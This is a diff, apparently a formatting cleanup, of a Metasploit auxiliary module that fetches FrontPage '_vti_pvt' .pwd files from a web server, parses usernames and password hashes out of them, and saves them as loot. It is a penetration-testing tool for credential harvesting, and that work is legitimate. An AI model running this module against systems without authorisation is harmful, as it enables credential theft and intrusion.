@@ -9,32 +9,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'FrontPage .pwd File Credential Dump',
-      'Description'    => %q{
-        This module downloads and parses the '_vti_pvt/service.pwd',
-        '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files on a FrontPage
-         server to find credentials.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'FrontPage .pwd File Credential Dump',
+        'Description' => %q{
+          This module downloads and parses the '_vti_pvt/service.pwd',
+          '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files on a FrontPage
+          server to find credentials.
+        },
+        'References' => [
           [ 'PACKETSTORM', '11556'],
           [ 'URL', 'https://insecure.org/sploits/Microsoft.frontpage.insecurities.html'],
           [ 'URL', 'http://sparty.secniche.org/' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Aditya K Sood @adityaksood', # Sparty tool'
           'Stephen Haywood @averagesecguy' # Metasploit module'
         ],
-      'License'        => MSF_LICENSE,
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options([
       OptString.new('TARGETURI', [true, 'The base path', '/'])
     ])
   end
-
 
   def get_pass_file(fname)
     uri = normalize_uri(target_uri.path, '_vti_pvt', fname)
@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Requesting: #{uri}")
     res = send_request_cgi({
       'uri' => uri,
-      'method' => 'GET',
+      'method' => 'GET'
     })
 
     unless res.code == 200
@@ -53,12 +53,12 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Found #{uri}.")
 
     unless res.body.lines.first.chomp == '# -FrontPage-'
-      vprint_status("File does not contain FrontPage credentials.")
+      vprint_status('File does not contain FrontPage credentials.')
       vprint_status(res.body)
       return nil
     end
 
-    vprint_status("Found FrontPage credentials.")
+    vprint_status('Found FrontPage credentials.')
     return res.body
   end
 
@@ -76,6 +76,7 @@ class MetasploitModule < Msf::Auxiliary
 
       contents.each_line do |line|
         next if line.chomp == '# -FrontPage-'
+
         user = line.chomp.split(':')[0]
         pass = line.chomp.split(':')[1]
 
@@ -84,8 +85,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'FrontPage Credentials',
-      'Indent'  => 1,
+      'Header' => 'FrontPage Credentials',
+      'Indent' => 1,
       'Columns' => ['Source', 'Username', 'Password Hash']
     )
 
@@ -94,12 +95,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line
-    print_line("#{cred_table}")
+    print_line(cred_table.to_s)
 
-    loot_name     = 'frontpage.creds'
-    loot_type     = 'text/csv'
+    loot_name = 'frontpage.creds'
+    loot_type = 'text/csv'
     loot_filename = 'frontpage_creds.csv'
-    loot_desc     = 'FrontPage Credentials'
+    loot_desc = 'FrontPage Credentials'
 
     p = store_loot(
       loot_name,
@@ -107,7 +108,8 @@ class MetasploitModule < Msf::Auxiliary
       rhost,
       cred_table.to_csv,
       loot_filename,
-      loot_desc)
+      loot_desc
+    )
 
     print_status "Credentials saved in: #{p}"
   end
